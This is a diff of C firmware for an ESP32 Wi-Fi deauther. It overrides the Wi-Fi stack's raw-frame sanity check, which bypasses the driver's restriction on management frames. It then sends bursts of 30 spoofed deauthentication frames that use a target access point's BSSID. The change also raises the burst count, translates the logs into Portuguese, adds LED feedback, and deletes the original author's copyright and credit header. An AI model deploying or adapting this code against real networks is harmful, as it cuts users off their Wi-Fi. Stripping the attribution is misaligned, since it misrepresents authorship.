@@ -1,13 +1,5 @@
-/**
- * @file wsl_bypasser.c
- * @author risinek (risinek@gmail.com)
- * @date 2021-04-05
- * @copyright Copyright (c) 2021
- *
- * @brief Implementation of Wi-Fi Stack Libaries bypasser.
- */
 #include "wsl_bypasser.h"
-
+#include "led_control.h"
 #include <stdint.h>
 #include <string.h>
 
@@ -60,23 +52,19 @@ static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
     }
 }
 
-/**
- * @brief Decompiled function that overrides original one at compilation time.
- *
- * @attention This function is not meant to be called!
- * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
- */
 int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
 }
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
-    ESP_LOGD(TAG, "Attempting to send raw frame of size %d", size);
+    ESP_LOGD(TAG, "Tentando enviar frame bruto de tamanho %d", size);
     esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
     if (ret != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to send raw frame: %s (0x%x)", esp_err_to_name(ret), ret);
+        ESP_LOGE(TAG, "Falha ao enviar frame bruto: %s (0x%x)", esp_err_to_name(ret), ret);
+        led_blink_red(); // Piscar vermelho em caso de erro
     } else {
-        ESP_LOGI(TAG, "Raw frame sent successfully");
+        ESP_LOGI(TAG, "Frame bruto enviado com sucesso");
+        led_blink_green(); // Piscar verde a cada frame enviado
     }
 }
 
@@ -84,7 +72,7 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_fr
     const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
     (type == DEAUTH_INACTIVITY) ? "INACTIVITY" :
     "CLASS3";
-    ESP_LOGD(TAG, "Preparing deauth frame (%s) to %s on channel %d", type_str, ap_record->ssid, ap_record->primary);
+    ESP_LOGD(TAG, "Preparando frame de deauth (%s) para %s no canal %d", type_str, ap_record->ssid, ap_record->primary);
     ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
              ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
              ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
@@ -95,15 +83,16 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_fr
     memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source MAC
     memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID
 
-    ESP_LOGD(TAG, "Switching to channel %d", ap_record->primary);
+    ESP_LOGD(TAG, "Mudando para canal %d", ap_record->primary);
     esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
     if (ret != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to set channel %d: %s", ap_record->primary, esp_err_to_name(ret));
+        ESP_LOGE(TAG, "Falha ao definir canal %d: %s", ap_record->primary, esp_err_to_name(ret));
+        led_blink_red(); // Piscar vermelho em caso de erro
         return;
     }
 
-    for (int i = 0; i < 30; i++) { // Envia 5 vezes
-        ESP_LOGD(TAG, "Sending deauth frame %d/%d", i + 1, 5);
+    for (int i = 0; i < 30; i++) { // Envia 30 vezes
+        ESP_LOGD(TAG, "Enviando frame de deauth %d/%d", i + 1, 30);
         wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
         vTaskDelay(100 / portTICK_PERIOD_MS); // Aguarda 100ms entre envios
     }
